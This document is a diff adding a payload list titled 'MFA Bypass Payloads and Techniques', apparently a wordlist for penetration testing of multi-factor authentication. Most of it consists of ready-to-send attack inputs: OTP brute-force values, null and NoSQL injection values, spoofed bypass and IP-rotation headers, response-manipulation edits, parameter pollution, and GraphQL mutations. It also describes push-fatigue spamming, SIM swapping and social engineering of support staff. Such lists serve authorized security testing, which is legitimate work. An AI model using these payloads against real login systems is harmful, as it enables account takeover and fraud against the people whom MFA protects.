@@ -1,0 +1,573 @@
+# MFA Bypass Payloads and Techniques
+# Comprehensive collection for authorized security testing
+# Test these against MFA verification endpoints
+
+# ============================================================================
+# OTP BRUTE FORCE VALUES
+# ============================================================================
+
+# 4-digit OTPs (10,000 combinations)
+# Range: 0000-9999
+# Tools: Burp Intruder, custom scripts
+
+# 6-digit OTPs (1,000,000 combinations)
+# Range: 000000-999999
+# May be feasible with rate limit bypass
+
+# Common test/debug OTPs
+000000
+111111
+123456
+123123
+654321
+999999
+100000
+200000
+112233
+121212
+131313
+141414
+696969
+777777
+888888
+696969
+420420
+1337
+
+# 4-digit common
+0000
+1111
+1234
+4321
+9999
+0123
+1212
+1313
+6969
+4444
+7777
+
+# ============================================================================
+# NULL/EMPTY BYPASSES
+# ============================================================================
+
+# Empty OTP attempts
+otp=
+otp=null
+otp=NULL
+otp=Null
+otp=undefined
+otp=nil
+otp=None
+otp=NaN
+otp=0
+otp=-1
+otp=false
+otp=true
+otp=[]
+otp={}
+otp=""
+otp=''
+
+# MFA code variations
+mfa_code=
+mfa_code=null
+mfa_code=undefined
+verification_code=
+verification_code=null
+code=
+code=null
+totp=
+totp=null
+token=
+token=null
+pin=
+pin=null
+
+# JSON format
+{"otp": null}
+{"otp": ""}
+{"otp": 0}
+{"otp": []}
+{"otp": {}}
+{"otp": false}
+{"otp": "null"}
+{"otp": "undefined"}
+{"mfa_code": null}
+{"verification_code": null}
+{"code": null}
+{"totp": null}
+
+# ============================================================================
+# ARRAY/OBJECT INJECTION
+# ============================================================================
+
+# PHP array injection
+otp[]=123456
+otp[]=
+otp[]=null
+otp[0]=123456
+otp[1]=000000
+mfa_code[]=
+verification_code[]=
+
+# NoSQL injection style
+otp={"$ne":""}
+otp={"$gt":""}
+otp={"$regex":".*"}
+otp={"$exists":true}
+{"otp":{"$ne":""}}
+{"otp":{"$gt":""}}
+{"otp":{"$regex":".*"}}
+
+# JSON array injection
+{"otp": ["123456"]}
+{"otp": [123456]}
+{"otp": ["", "123456"]}
+
+# ============================================================================
+# RESPONSE MANIPULATION
+# ============================================================================
+
+# Intercept and change in response:
+"success": false -> "success": true
+"verified": false -> "verified": true
+"valid": false -> "valid": true
+"mfa_required": true -> "mfa_required": false
+"mfa_verified": false -> "mfa_verified": true
+"2fa_required": true -> "2fa_required": false
+"two_factor_required": true -> "two_factor_required": false
+"otp_valid": false -> "otp_valid": true
+"status": "pending" -> "status": "verified"
+"status": "failed" -> "status": "success"
+"error": true -> "error": false
+"authenticated": false -> "authenticated": true
+HTTP 403 -> HTTP 200
+HTTP 401 -> HTTP 200
+HTTP 302 (to mfa page) -> HTTP 302 (to dashboard)
+
+# ============================================================================
+# DIRECT ENDPOINT ACCESS (MFA SKIP)
+# ============================================================================
+
+# Try accessing these after initial auth but before MFA:
+/dashboard
+/home
+/account
+/profile
+/settings
+/admin
+/api/user
+/api/me
+/api/profile
+/api/account
+/api/dashboard
+/api/v1/user
+/api/v1/me
+/user/dashboard
+/user/home
+/member/home
+/portal
+/main
+/app
+/console
+
+# Headers to add when skipping:
+X-MFA-Verified: true
+X-MFA-Verified: 1
+X-2FA-Bypass: true
+X-2FA-Verified: true
+X-Auth-Skip: true
+X-OTP-Verified: true
+X-Verification-Skip: true
+X-MFA-Token: valid
+X-MFA-Status: verified
+MFA-Verified: true
+2FA-Status: complete
+
+# ============================================================================
+# RATE LIMIT BYPASS
+# ============================================================================
+
+# Rotate IP addresses with headers:
+X-Forwarded-For: {random_ip}
+X-Real-IP: {random_ip}
+X-Originating-IP: {random_ip}
+X-Remote-IP: {random_ip}
+X-Remote-Addr: {random_ip}
+True-Client-IP: {random_ip}
+Client-IP: {random_ip}
+CF-Connecting-IP: {random_ip}
+Forwarded: for={random_ip}
+
+# Change endpoint variations:
+/verify -> /Verify
+/verify -> /VERIFY
+/verify -> /verify/
+/verify -> /verify?
+/api/verify -> /api//verify
+/api/verify -> /api/./verify
+
+# Change request method:
+POST -> GET
+POST -> PUT
+POST -> PATCH
+
+# Techniques:
+# - Add delays between requests
+# - Use multiple accounts in rotation
+# - Change User-Agent with each request
+# - Use different parameter names
+# - Null byte in parameter: otp%00=123456
+# - Unicode spaces in parameter name
+
+# ============================================================================
+# BACKUP CODE ATTACKS
+# ============================================================================
+
+# Common backup code formats:
+# 8 alphanumeric
+12345678
+ABCD1234
+abcd1234
+A1B2C3D4
+1A2B3C4D
+AAAA1111
+1111AAAA
+
+# 10 alphanumeric
+1234567890
+ABCDEFGHIJ
+0123456789
+aaaaaaaaaa
+
+# Hyphenated formats
+1234-5678-9012
+ABCD-EFGH-IJKL
+1234-5678
+ABCD-1234
+
+# Common weak backup codes
+00000000
+11111111
+12345678
+87654321
+AAAAAAAA
+xxxxxxxx
+testtest
+backup01
+backup00
+recovery
+recover1
+
+# ============================================================================
+# REMEMBER DEVICE BYPASS
+# ============================================================================
+
+# Steal/replay device token:
+remember_device=true
+remember_device=1
+trust_device=true
+trust_device=1
+trusted=true
+trusted=1
+device_trusted=true
+skip_mfa=true
+skip_2fa=true
+
+# Cookie manipulation:
+device_token={captured_token}
+device_id={captured_id}
+trusted_device={captured_value}
+remember_token={captured_token}
+device_fingerprint={captured_fingerprint}
+
+# Headers:
+X-Device-Token: {captured_token}
+X-Trusted-Device: true
+X-Device-ID: {captured_id}
+X-Remember-Device: true
+
+# ============================================================================
+# SESSION MANIPULATION
+# ============================================================================
+
+# After partial auth (pre-MFA), try:
+# - Access other endpoints with partial session
+# - Check for auth tokens already set in cookies
+# - Look for JWT that grants access without MFA flag
+# - Try to elevate session directly
+
+# Session-related parameters:
+mfa_complete=true
+mfa_complete=1
+mfa_verified=true
+auth_step=3
+auth_step=complete
+auth_level=2
+authentication_state=complete
+2fa_state=verified
+verification_complete=true
+
+# ============================================================================
+# OTP REUSE ATTACKS
+# ============================================================================
+
+# Techniques:
+# - Try using same OTP multiple times
+# - Try using previously used valid OTPs
+# - Check if OTPs expire properly
+# - Try OTP from one account on another
+# - Try OTP on different endpoints
+
+# Test with timing:
+# - Use OTP, wait 30s, use again
+# - Use OTP, wait 60s, use again
+# - Use OTP on login, then on password reset
+
+# ============================================================================
+# TIMING ATTACKS
+# ============================================================================
+
+# Check if OTP validation timing differs:
+# - Longer response = partial match
+# - Different timing for valid vs invalid user
+# - Measure response time per character
+
+# Statistical analysis approach:
+# - Send many requests with known-invalid OTPs
+# - Calculate average response time
+# - Identify outliers that might indicate partial matches
+
+# ============================================================================
+# RECOVERY FLOW BYPASS
+# ============================================================================
+
+# Password reset might skip MFA:
+/forgot-password
+/reset-password
+/password-recovery
+/account-recovery
+/recover
+
+# Account recovery might skip MFA:
+/recover-account
+/account/recover
+/help/locked-out
+/support/access
+
+# Support ticket might bypass MFA:
+# - Contact support claiming lost MFA device
+# - Social engineering via support channels
+
+# ============================================================================
+# OAUTH/SSO BYPASS
+# ============================================================================
+
+# OAuth flows that might skip MFA:
+/oauth/authorize
+/auth/google
+/auth/facebook
+/auth/github
+/auth/microsoft
+/sso/login
+/saml/login
+
+# Techniques:
+# - Link social account (might skip MFA setup)
+# - Use SSO provider (might not enforce MFA)
+# - OAuth token exchange (might skip MFA check)
+# - Account linking flows
+
+# ============================================================================
+# RACE CONDITIONS
+# ============================================================================
+
+# Send simultaneously:
+# 1. Multiple OTP verification attempts
+# 2. Login + OTP verification at same time
+# 3. Session creation + MFA verification race
+# 4. Multiple MFA disable requests
+
+# Tools:
+# - Burp Turbo Intruder
+# - Race-the-web
+# - Custom concurrent scripts
+
+# Patterns:
+# - Send 100 identical valid OTP requests simultaneously
+# - Send login request + protected resource access simultaneously
+# - Send OTP verification + session validation simultaneously
+
+# ============================================================================
+# PARAMETER POLLUTION
+# ============================================================================
+
+# HTTP Parameter Pollution:
+mfa_code=123456&mfa_code=000000
+mfa_code=wrong&mfa_code=correct
+otp=a&otp=123456
+otp=123456&otp=
+verification_code=invalid&verification_code=valid
+code[]=123456&code[]=000000
+
+# JSON pollution:
+{"otp":"wrong","otp":"correct"}
+{"mfa_code":"","mfa_code":"123456"}
+
+# ============================================================================
+# ENCODING BYPASSES
+# ============================================================================
+
+# URL encoding:
+otp=123456%00
+otp=%31%32%33%34%35%36
+otp=123456%0a
+otp=123456%0d
+otp=123456%09
+otp=123456%20
+
+# Double encoding:
+otp=%2531%2532%2533%2534%2535%2536
+
+# Unicode variations:
+otp=１２３４５６ (fullwidth)
+otp=123456 (with unicode spaces)
+
+# Base64:
+otp=MTIzNDU2
+
+# ============================================================================
+# PUSH NOTIFICATION ATTACKS
+# ============================================================================
+
+# Push fatigue attack:
+# - Spam push notifications repeatedly
+# - User might approve to stop notifications
+# - Best done during busy hours
+
+# Techniques:
+# - Send 50+ push requests rapidly
+# - Send during off-hours when user is tired
+# - Send with misleading context
+
+# Interception:
+# - Intercept push notification
+# - Replay push acceptance token
+# - MITM push notification channel
+
+# ============================================================================
+# SMS/VOICE INTERCEPTION
+# ============================================================================
+
+# SIM swap attack vectors:
+# - Social engineering mobile carrier
+# - Insider threat at carrier
+# - Port-out scam
+
+# SS7 interception:
+# - SMS interception via SS7 vulnerabilities
+# - Requires access to telecom infrastructure
+
+# Voicemail hacking:
+# - Access voicemail for voice OTP
+# - Default voicemail PINs
+# - Voicemail spoofing
+
+# Call forwarding:
+# - Setup call forwarding to attacker number
+# - Intercept voice OTPs
+
+# ============================================================================
+# TOTP MANIPULATION
+# ============================================================================
+
+# Time drift attacks:
+# - Try OTPs from previous 30s windows
+# - Try OTPs from next 30s windows
+# - Server might accept wider time range
+
+# Test windows:
+# - Current window
+# - Previous window (-30s)
+# - Next window (+30s)
+# - T-60s, T-90s (generous servers)
+# - T+60s, T+90s (generous servers)
+
+# Secret extraction:
+# - QR code exposed in HTML/JS
+# - Secret in API response
+# - Backup in client storage
+# - Debug endpoints exposing secret
+
+# ============================================================================
+# MFA DISABLE/DOWNGRADE
+# ============================================================================
+
+# Try to disable MFA:
+/settings/security/mfa/disable
+/api/mfa/disable
+/api/2fa/disable
+/account/security/2fa
+/profile/mfa
+/user/mfa/remove
+
+# Downgrade attacks:
+# - Disable SMS, keep email
+# - Disable TOTP, keep backup codes
+# - Remove all but weakest method
+
+# Parameters:
+mfa_enabled=false
+mfa_enabled=0
+two_factor=disabled
+2fa=off
+security_level=low
+
+# ============================================================================
+# MOBILE APP MFA BYPASS
+# ============================================================================
+
+# Decompile app and look for:
+# - Hardcoded MFA bypass
+# - Debug flags
+# - Hidden parameters
+
+# API manipulation:
+# - Different API version might skip MFA
+# - Mobile API vs web API differences
+# - Legacy endpoints without MFA
+
+# Root/jailbreak bypass:
+# - Bypass certificate pinning
+# - Modify app behavior
+# - Intercept MFA verification
+
+# ============================================================================
+# WEBSOCKET MFA BYPASS
+# ============================================================================
+
+# If MFA uses WebSocket:
+# - Replay valid MFA messages
+# - Manipulate WebSocket frames
+# - Race conditions in async flow
+
+# Messages to try:
+{"type":"mfa_verify","code":"000000"}
+{"type":"mfa_complete","status":"success"}
+{"type":"skip_mfa","bypass":true}
+
+# ============================================================================
+# GRAPHQL MFA BYPASS
+# ============================================================================
+
+# Mutations to try:
+mutation { verifyMFA(code: "") { success } }
+mutation { verifyMFA(code: null) { success } }
+mutation { verifyMFA(code: "000000") { success } }
+mutation { skipMFA { success } }
+mutation { disableMFA { success } }
+
+# Introspection for MFA fields:
+# Query schema for bypass mutations
+# Look for admin-only MFA mutations
